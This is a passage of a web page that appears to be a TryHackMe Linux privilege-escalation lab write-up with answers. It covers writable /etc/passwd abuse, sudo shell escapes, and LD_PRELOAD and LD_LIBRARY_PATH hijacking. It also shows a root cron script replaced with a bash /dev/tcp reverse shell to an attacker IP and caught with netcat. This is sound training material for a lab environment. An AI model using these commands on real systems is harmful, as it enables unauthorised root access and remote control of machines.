class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~/tools/mysql-udf$ openssl passwd newpasswordhere</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Warning: truncating password to 8 characters</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">auXs47FeobsN.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~/tools/mysql-udf$ ls -l /etc/passwd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--rw- 1 root root 1009 Aug 25  2019 /etc/passwd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~/tools/mysql-udf$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~/tools/mysql-udf$ cat /etc/passwd</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root:auXs47FeobsN.:0:0:root:/root:/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bin:x:2:2:bin:/bin:/bin/sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sys:x:3:3:sys:/dev:/bin/sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sync:x:4:65534:sync:/bin:/bin/sync</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">games:x:5:60:games:/usr/games:/bin/sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">man:x:6:12:man:/var/cache/man:/bin/sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mail:x:8:8:mail:/var/mail:/bin/sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">news:x:9:9:news:/var/spool/news:/bin/sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">proxy:x:13:13:proxy:/bin:/bin/sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">backup:x:34:34:backup:/var/backups:/bin/sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Debian-exim:x:101:103::/var/spool/exim4:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:x:1000:1000:user,,,:/home/user:/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">statd:x:103:65534::/var/lib/nfs:/bin/false</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">mysql:x:104:106:MySQL Server,,,:/var/lib/mysql:/bin/false</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~/tools/mysql-udf$ su root</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Password:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@debian:/home/user/tools/mysql-udf# cd ~</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@debian:~# id</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">uid=0(root) gid=0(root) groups=0(root)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@debian:~# exit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">exit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~/tools/mysql-udf$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol><li>Run the &quot;id&quot; command as the newroot user. What is the result?</li></ol><h2 class="anchor anchorWithStickyNavbar_LWe7" id="sudo---shell-escape-sequences">Sudo - Shell Escape Sequences<a href="#sudo---shell-escape-sequences" class="hash-link" aria-label="Direct link to Sudo - Shell Escape Sequences" title="Direct link to Sudo - Shell Escape Sequences">​</a></h2><p>List the programs which sudo allows your user to run:</p><p><code>sudo -l</code></p><p>Visit GTFOBins (<a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">https://gtfobins.github.io</a>) and search for some of the program names. If the program is listed with &quot;sudo&quot; as a function, you can use it to elevate privileges, usually via an escape sequence.</p><p>Choose a program from the list and try to gain a root shell, using the instructions from GTFOBins.</p><p>For an extra challenge, try to gain a root shell using all the programs on the list!</p><p><strong>Remember to exit out of the root shell before continuing!</strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~/tools/mysql-udf$ sudo -l</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Matching Defaults entries for user on this host:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">User user may run the following commands on this host:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    (root) NOPASSWD: /usr/sbin/iftop</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    (root) NOPASSWD: /usr/bin/find</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    (root) NOPASSWD: /usr/bin/nano</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    (root) NOPASSWD: /usr/bin/vim</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    (root) NOPASSWD: /usr/bin/man</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    (root) NOPASSWD: /usr/bin/awk</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    (root) NOPASSWD: /usr/bin/less</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    (root) NOPASSWD: /usr/bin/ftp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    (root) NOPASSWD: /usr/bin/nmap</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    (root) NOPASSWD: /usr/sbin/apache2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    (root) NOPASSWD: /bin/more</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol><li>How many programs is &quot;user&quot; allowed to run via sudo?</li></ol><p><code>11</code></p><ol start="2"><li>One program on the list doesn&#x27;t have a shell escape sequence on GTFOBins. Which is it?</li></ol><ul><li><a href="https://gtfobins.github.io/#iftop" target="_blank" rel="noopener noreferrer">iftop</a></li><li><a href="https://gtfobins.github.io/#find" target="_blank" rel="noopener noreferrer">find</a></li><li><a href="https://gtfobins.github.io/#nano" target="_blank" rel="noopener noreferrer">nano</a></li><li><a href="https://gtfobins.github.io/#vim" target="_blank" rel="noopener noreferrer">vim</a></li><li><a href="https://gtfobins.github.io/#man" target="_blank" rel="noopener noreferrer">man</a></li><li><a href="https://gtfobins.github.io/#awk" target="_blank" rel="noopener noreferrer">awk</a></li><li><a href="https://gtfobins.github.io/#less" target="_blank" rel="noopener noreferrer">less</a></li><li><a href="https://gtfobins.github.io/#ftp" target="_blank" rel="noopener noreferrer">ftp</a></li><li><a href="https://gtfobins.github.io/#apache2" target="_blank" rel="noopener noreferrer">apache2</a></li><li><a href="https://gtfobins.github.io/#more" target="_blank" rel="noopener noreferrer">more</a></li></ul><p><code>apache2</code></p><ol><li>Consider how you might use this program with sudo to gain root privileges without a shell escape sequence.</li></ol><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="sudo---environment-variables">Sudo - Environment Variables<a href="#sudo---environment-variables" class="hash-link" aria-label="Direct link to Sudo - Environment Variables" title="Direct link to Sudo - Environment Variables">​</a></h2><p>Sudo can be configured to inherit certain environment variables from the user&#x27;s environment.</p><p>Check which environment variables are inherited (look for the env_keep options):</p><p><code>sudo -l</code></p><p>LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user&#x27;s environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.</p><p>Create a shared object using the code located at /home/user/tools/sudo/preload.c:</p><p><code>gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c</code></p><p>Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object:</p><p><code>sudo LD_PRELOAD=/tmp/preload.so program-name-here</code></p><p>A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.</p><p>Run ldd against the apache2 program file to see which shared libraries are used by the program:</p><p><code>ldd /usr/sbin/apache2</code></p><p>Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:</p><p><code>gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c</code></p><p>Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):</p><p><code>sudo LD_LIBRARY_PATH=/tmp apache2</code></p><p>A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again. Did it work? If not, try to figure out why not, and how the library_path.c code could be changed to make it work.</p><p><strong>Remember to exit out of the root shell before continuing!</strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ sudo -l</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Matching Defaults entries for user on this host:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">User user may run the following commands on this host:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    (root) NOPASSWD: /usr/sbin/iftop</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    (root) NOPASSWD: /usr/bin/find</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    (root) NOPASSWD: /usr/bin/nano</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    (root) NOPASSWD: /usr/bin/vim</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    (root) NOPASSWD: /usr/bin/man</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    (root) NOPASSWD: /usr/bin/awk</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    (root) NOPASSWD: /usr/bin/less</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    (root) NOPASSWD: /usr/bin/ftp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    (root) NOPASSWD: /usr/bin/nmap</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    (root) NOPASSWD: /usr/sbin/apache2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    (root) NOPASSWD: /bin/more</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ sudo LD_PRELOAD=/tmp/preload.so nano</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@debian:/home/user# cd ~</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ ldd /usr/sbin/apache2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        linux-vdso.so.1 =&gt;  (0x00007fff853b3000)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f8b23ed1000)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        libaprutil-1.so.0 =&gt; /usr/lib/libaprutil-1.so.0 (0x00007f8b23cad000)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        libapr-1.so.0 =&gt; /usr/lib/libapr-1.so.0 (0x00007f8b23a73000)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        libpthread.so.0 =&gt; /lib/libpthread.so.0 (0x00007f8b23857000)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        libc.so.6 =&gt; /lib/libc.so.6 (0x00007f8b234eb000)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        libuuid.so.1 =&gt; /lib/libuuid.so.1 (0x00007f8b232e6000)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        librt.so.1 =&gt; /lib/librt.so.1 (0x00007f8b230de000)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        libcrypt.so.1 =&gt; /lib/libcrypt.so.1 (0x00007f8b22ea7000)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        libdl.so.2 =&gt; /lib/libdl.so.2 (0x00007f8b22ca2000)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        libexpat.so.1 =&gt; /usr/lib/libexpat.so.1 (0x00007f8b22a7a000)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        /lib64/ld-linux-x86-64.so.2 (0x00007f8b2438e000)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ sudo LD_LIBRARY_PATH=/tmp apache2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/libaprutil-1.so.0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@debian:/home/user# exit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">exit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">apache2: bad user name ${APACHE_RUN_USER}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ol><li>Read and follow along with the above.</li></ol><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="cron-jobs---file-permissions">Cron Jobs - File Permissions<a href="#cron-jobs---file-permissions" class="hash-link" aria-label="Direct link to Cron Jobs - File Permissions" title="Direct link to Cron Jobs - File Permissions">​</a></h2><p>Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.</p><p>View the contents of the system-wide crontab:</p><p><code>cat /etc/crontab</code></p><p>There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.</p><p>Locate the full path of the overwrite.sh file:</p><p><code>locate overwrite.sh</code></p><p>Note that the file is world-writable:</p><p><code>ls -l /usr/local/bin/overwrite.sh</code></p><p>Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">#!/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.</p><p><code>nc -nvlp 4444</code></p><p><strong>Remember to exit out of the root shell and remove the reverse shell code before continuing!</strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">kali@kali:~/CTFs/tryhackme/Linux PrivEsc$ cat /etc/crontab</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># /etc/crontab: system-wide crontab</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># command to install the new version when you edit this file</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># and files in /etc/cron.d. These files also have username fields,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># that none of the other crontabs do.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SHELL=/bin/sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Example of job definition:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># .---------------- minute (0 - 59)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># |  .------------- hour (0 - 23)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># |  |  .---------- day of month (1 - 31)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># |  |  |  |  |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># *  *  *  *  * user-name command to be executed</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ cat /etc/crontab</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># /etc/crontab: system-wide crontab</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># command to install the new version when you edit this file</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># and files in /etc/cron.d. These files also have username fields,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># that none of the other crontabs do.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SHELL=/bin/sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># m h dom mon dow user  command</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">#</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* * * * * root overwrite.sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* * * * * root /usr/local/bin/compress.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ locate overwrite.sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">locate: warning: database `/var/cache/locate/locatedb&#x27; is more than 8 days old (actual age is 138.1 days)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/usr/local/bin/overwrite.sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ ls -l /usr/local/bin/overwrite.sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ nano /usr/local/bin/overwrite.sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user@debian:~$ cat /usr/local/bin/overwrite.sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">#!/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bash -i &gt;&amp; /dev/tcp/10.8.106.222/9001 0&gt;&amp;1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span 